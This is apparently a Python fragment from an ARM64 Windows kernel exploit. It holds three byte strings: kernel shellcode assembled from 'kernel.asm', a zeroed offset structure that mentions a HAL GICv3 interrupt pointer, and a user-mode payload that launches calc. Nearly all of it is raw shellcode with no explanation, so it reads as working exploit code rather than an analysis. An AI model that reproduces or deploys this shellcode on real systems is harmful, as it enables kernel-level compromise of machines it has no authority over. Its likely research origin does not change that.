
# ARM64 kernel shellcode from kernel.asm
KERNEL_SHELLCODE = b""
KERNEL_SHELLCODE += b"\xff\x83\x04\xd1\xe0\x07\x00\xa9\xe2\x0f\x01\xa9\xe4\x17\x02\xa9"
KERNEL_SHELLCODE += b"\xe6\x1f\x03\xa9\xe8\x27\x04\xa9\xea\x2f\x05\xa9\xec\x37\x06\xa9"
KERNEL_SHELLCODE += b"\xee\x3f\x07\xa9\xf0\x47\x08\xa9\xf2\x4f\x09\xa9\xf4\x57\x0a\xa9"
KERNEL_SHELLCODE += b"\xf6\x5f\x0b\xa9\xf8\x67\x0c\xa9\xfa\x6f\x0d\xa9\xfc\x77\x0e\xa9"
KERNEL_SHELLCODE += b"\xfe\x7b\x00\xf9\x33\x1c\x00\x10\x69\x22\x40\xa9\x28\x01\x00\xf9"
KERNEL_SHELLCODE += b"\x48\xc6\x44\xf9\x03\x59\x40\xf9\x60\x20\x10\x91\xab\x00\x00\x94"
KERNEL_SHELLCODE += b"\xcb\x19\x00\x18\x05\x00\x00\x14\x63\x54\x41\xf9\x63\xa0\x0a\xd1"
KERNEL_SHELLCODE += b"\x60\x20\x10\x91\xa5\x00\x00\x94\x1f\x00\x0b\x6b\x61\xff\xff\x54"
KERNEL_SHELLCODE += b"\x63\x12\x00\xf9\x69\x1c\x40\xf9\x68\x20\x40\xf9\x0a\x61\x0c\xd1"
KERNEL_SHELLCODE += b"\x34\x61\x0c\xd1\x06\x00\x00\x14\x88\x6e\x40\xb9\x08\x01\x1c\x12"
KERNEL_SHELLCODE += b"\xc8\x00\x00\x35\x89\x8e\x41\xf9\x34\x61\x0c\xd1\x5f\x01\x14\xeb"
KERNEL_SHELLCODE += b"\x41\xff\xff\x54\x47\x00\x00\x14\x74\x7e\x00\xf9\x04\xc0\x38\xd5"
KERNEL_SHELLCODE += b"\x88\x00\x40\x79\xa9\x49\x8b\x52\x1f\x01\x09\x6b\xa0\x00\x00\x54"
KERNEL_SHELLCODE += b"\x84\x04\x40\xd1\x88\x00\x40\x79\x1f\x01\x09\x6b\xa1\xff\xff\x54"
KERNEL_SHELLCODE += b"\x64\x0e\x00\xf9\x21\x16\x00\x18\xe0\x03\x04\xaa\x91\x00\x00\x94"
KERNEL_SHELLCODE += b"\x60\x22\x00\xf9\xc1\x15\x00\x18\xe0\x03\x04\xaa\x8d\x00\x00\x94"
KERNEL_SHELLCODE += b"\x60\x1a\x00\xf9\x61\x15\x00\x18\xe0\x03\x04\xaa\x89\x00\x00\x94"
KERNEL_SHELLCODE += b"\x60\x1e\x00\xf9\x01\x15\x00\x18\xe0\x03\x04\xaa\x85\x00\x00\x94"
KERNEL_SHELLCODE += b"\x60\x16\x00\xf9\xa1\x14\x00\x18\xe0\x03\x04\xaa\x81\x00\x00\x94"
KERNEL_SHELLCODE += b"\x60\x26\x00\xf9\x41\x14\x00\x18\xe0\x03\x04\xaa\x7d\x00\x00\x94"
KERNEL_SHELLCODE += b"\x60\x2a\x00\xf9\x64\x14\x00\x58\x84\xcc\x74\x92\x88\x00\x40\x79"
KERNEL_SHELLCODE += b"\xa9\x49\x8b\x52\x1f\x01\x09\x6b\xa0\x00\x00\x54\x84\x04\x40\xd1"
KERNEL_SHELLCODE += b"\x88\x00\x40\x79\x1f\x01\x09\x6b\xa1\xff\xff\x54\x64\x0a\x00\xf9"
KERNEL_SHELLCODE += b"\xa1\x12\x00\x18\xe0\x03\x04\xaa\x6e\x00\x00\x94\x60\x32\x00\xf9"
KERNEL_SHELLCODE += b"\x01\x12\x00\x18\xe0\x03\x04\xaa\x6a\x00\x00\x94\x60\x2e\x00\xf9"
KERNEL_SHELLCODE += b"\x68\x26\x40\xf9\x63\x04\x00\x10\x07\x00\x80\xd2\x60\xa2\x01\x91"
KERNEL_SHELLCODE += b"\x06\x00\x80\x52\x05\x00\x80\xd2\x04\x00\x80\xd2\x02\x00\x80\x52"
KERNEL_SHELLCODE += b"\x61\x7e\x40\xf9\x00\x01\x3f\xd6\x68\x2a\x40\xf9\x03\x00\x80\x52"
KERNEL_SHELLCODE += b"\x02\x00\x80\xd2\x01\x00\x80\xd2\x60\xa2\x01\x91\x00\x01\x3f\xd6"
KERNEL_SHELLCODE += b"\xe0\x07\x40\xa9\xe2\x0f\x41\xa9\xe4\x17\x42\xa9\xe6\x1f\x43\xa9"
KERNEL_SHELLCODE += b"\xe8\x27\x44\xa9\xea\x2f\x45\xa9\xec\x37\x46\xa9\xee\x3f\x47\xa9"
KERNEL_SHELLCODE += b"\xf0\x47\x48\xa9\xf2\x4f\x49\xa9\xf4\x57\x4a\xa9\xf6\x5f\x4b\xa9"
KERNEL_SHELLCODE += b"\xf8\x67\x4c\xa9\xfa\x6f\x4d\xa9\xfc\x77\x4e\xa9\xfe\x7b\x40\xf9"
KERNEL_SHELLCODE += b"\xff\x83\x04\x91\xe8\x0d\x00\x58\x00\x01\x1f\xd6\xc0\x03\x5f\xd6"
KERNEL_SHELLCODE += b"\xf3\x53\xbe\xa9\xf5\x0b\x00\xf9\xfd\x7b\xbf\xa9\xfd\x03\x00\x91"
KERNEL_SHELLCODE += b"\xff\x43\x00\xd1\xb3\x0c\x00\x10\x40\xe2\x40\x39\x60\xc2\x03\x39"
KERNEL_SHELLCODE += b"\x68\x2e\x40\xf9\x00\x00\x80\xd2\x00\x01\x3f\xd6\x61\xa2\x01\x91"
KERNEL_SHELLCODE += b"\x60\x12\x40\xf9\x68\x1a\x40\xf9\x00\x01\x3f\xd6\x08\x00\x82\xd2"
KERNEL_SHELLCODE += b"\x7f\xa2\x0c\xa9\x68\x16\x40\xf9\x05\x08\x80\x52\x04\x00\x82\x52"
KERNEL_SHELLCODE += b"\x63\x42\x03\x91\x02\x00\x80\xd2\x61\x22\x03\x91\x00\x00\x80\x92"
KERNEL_SHELLCODE += b"\x00\x01\x3f\xd6\xc0\x02\x00\x35\x0a\x12\x00\x10\x6b\x66\x40\xf9"
KERNEL_SHELLCODE += b"\x4c\x01\x04\x91\x48\x25\xc1\xa8\x68\x25\x81\xa8\x5f\x01\x0c\xeb"
KERNEL_SHELLCODE += b"\xa1\xff\xff\x54\x68\x82\x03\x91\xe8\x07\x00\xf9\x66\x66\x40\xf9"
KERNEL_SHELLCODE += b"\x68\x22\x40\xf9\x69\x62\x03\x91\x07\x00\x80\xd2\xe9\x03\x00\xf9"
KERNEL_SHELLCODE += b"\x05\x00\x80\xd2\x04\x00\x80\xd2\x03\x00\x80\x52\x02\x00\x80\x52"
KERNEL_SHELLCODE += b"\x01\x00\x80\xd2\x00\x00\x80\x92\x00\x01\x3f\xd6\x68\x1e\x40\xf9"
KERNEL_SHELLCODE += b"\x60\xa2\x01\x91\x00\x01\x3f\xd6\x60\xc2\x43\x39\x68\x32\x40\xf9"
KERNEL_SHELLCODE += b"\x00\x01\x3f\xd6\xff\x43\x00\x91\xfd\x7b\xc1\xa8\xf5\x0b\x40\xf9"
KERNEL_SHELLCODE += b"\xf3\x53\xc2\xa8\xc0\x03\x5f\xd6\xe9\x03\x00\xaa\x28\x01\xc0\x39"
KERNEL_SHELLCODE += b"\x00\x00\x80\x52\x0a\x00\x80\x52\xa8\x00\x00\x34\x4a\x05\x00\x11"
KERNEL_SHELLCODE += b"\x00\x40\xc8\x1a\x28\xc9\xea\x38\xa8\xff\xff\x35\xc0\x03\x5f\xd6"
KERNEL_SHELLCODE += b"\xfd\x7b\xbf\xa9\xfd\x03\x00\x91\xee\x03\x00\xaa\xc8\x3d\x40\xb9"
KERNEL_SHELLCODE += b"\x0d\x00\x80\x52\xc9\x41\x28\x8b\x2a\x89\x40\xb9\xcb\x41\x2a\x8b"
KERNEL_SHELLCODE += b"\x6c\x21\x44\x29\x69\x1d\x40\xb9\xcf\x41\x28\x8b\xc8\x49\x6c\xb8"
KERNEL_SHELLCODE += b"\xc6\x41\x2c\x8b\xc7\x41\x29\x8b\x03\x00\x00\x14\xad\x05\x00\x11"
KERNEL_SHELLCODE += b"\xc8\xd8\x6d\xb8\xc0\x41\x28\x8b\xe4\xff\xff\x97\x1f\x00\x01\x6b"
KERNEL_SHELLCODE += b"\x61\xff\xff\x54\xe8\xd9\x6d\x78\xe8\x78\x68\xb8\xc0\x41\x28\x8b"
KERNEL_SHELLCODE += b"\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6\x3a\xb6\xd6\xc5\x76\xb6\x65\x78"
KERNEL_SHELLCODE += b"\x85\x85\x87\x42\x0d\xf1\x42\x52\x4e\xd3\xda\x88\x87\xf7\xb2\xb9"
KERNEL_SHELLCODE += b"\xd2\x61\xd0\x99\x30\x81\x80\xaa\xa8\x2b\x1b\x89\x22\x02\xb1\xfb"
KERNEL_SHELLCODE += b"\x36\xa5\x50\x29\x60\x63\x76\x68"

# Our data structure with offsets
KERNEL_DATA_STRUCT = b""
# KERNEL_DATA_STRUCT += b"\x42\x42\x42\x42\x42\x42\x42\x42" # m_pHalpGic3RequestInterrupt
# KERNEL_DATA_STRUCT += b"\x43\x43\x43\x43\x43\x43\x43\x43" # m_HalpGic3RequestInterrupt
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
KERNEL_DATA_STRUCT += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

# Popping a calc ARM64. user.asm
USER_PAYLOAD = b""
USER_PAYLOAD += b"\xE8\x03\x12\xAA\x13\x31\x40\xF9\x73\x0E\x40\xF9\x73\x0A\x40\xF9"
USER_PAYLOAD += b"\x73\x02\x40\xF9\x73\x02\x40\xF9\x60\x1A\x40\xF9\x0D\x00\x80\x52"
USER_PAYLOAD += b"\x08\x3C\x40\xB9\x07\xCC\x8F\x52\x47\xB2\xBA\x72\x09\x40\x28\x8B"
USER_PAYLOAD += b"\x2A\x89\x40\xB9\x0B\x40\x2A\x8B\x6C\x21\x44\x29\x69\x1D\x40\xB9"
USER_PAYLOAD += b"\x0E\x40\x28\x8B\x0F\x40\x29\x8B\x0B\x40\x2C\x8B\x6A\x45\x40\xB8"
USER_PAYLOAD += b"\x09\x00\x80\x52\x08\x48\xEA\x38\xE8\x00\x00\x34\x0A\x40\x2A\x8B"
USER_PAYLOAD += b"\x29\x41\xC8\x1A\x48\x1D\xC0\x38\xC8\xFF\xFF\x35\x3F\x01\x07\x6B"
USER_PAYLOAD += b"\x60\x00\x00\x54\xAD\x05\x00\x11\xF5\xFF\xFF\x17\xC8\xD9\x6D\x78"
USER_PAYLOAD += b"\xE8\x79\x68\xB8\x01\x40\x28\x8B\xFD\x7B\xBF\xA9\xFD\x03\x00\x91"
USER_PAYLOAD += b"\x80\x00\x00\x10\x20\x00\x3F\xD6\xFD\x7B\xC1\xA8\xC0\x03\x5F\xD6"
USER_PAYLOAD += b"\x63\x61\x6C\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
